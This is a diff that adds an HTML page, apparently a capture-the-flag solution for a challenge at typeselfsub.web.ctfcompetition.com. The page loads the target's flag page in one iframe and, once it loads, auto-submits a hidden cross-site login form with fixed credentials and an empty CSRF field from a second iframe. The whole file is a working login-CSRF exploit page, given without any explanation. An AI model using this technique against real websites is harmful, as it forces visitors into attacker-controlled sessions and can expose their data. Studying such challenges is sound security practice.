@@ -1,0 +1,22 @@
+<html> 
+<head>
+
+</head> 
+<body>
+    <iframe id="flag" src="https://typeselfsub.web.ctfcompetition.com/flag">
+    </iframe> 
+    <iframe id="login" srcdoc='
+        <form action="https://typeselfsub.web.ctfcompetition.com/login" name="fa" method="POST"> 
+        <input name="username" value="Non"> 
+        <input name="password" value="Non"> 
+        <input name="csrf">
+        </form> 
+    '>
+    </iframe> 
+    <script> 
+    flag.onload=function(){
+        login.contentWindow.document.forms[0].submit();  
+    }      
+</script> 
+</body> 
+</html>
